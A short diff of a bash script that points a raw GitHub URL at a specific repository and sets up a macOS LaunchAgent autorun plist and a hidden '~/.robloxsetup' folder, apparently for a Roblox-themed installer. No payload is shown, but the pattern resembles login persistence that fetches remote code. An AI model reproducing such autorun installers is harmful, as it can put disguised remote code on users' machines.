@@ -1,7 +1,7 @@
 #!/bin/bash
 set -euo pipefail
 
-REPO_RAW="https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main"
+REPO_RAW="https://raw.githubusercontent.com/cryptrixz/cryptrix1/main"
 PLIST_NAME="com.robloxsetup.autorun.plist"
 PLIST_DEST="$HOME/Library/LaunchAgents/$PLIST_NAME"
 WORKDIR="$HOME/.robloxsetup"
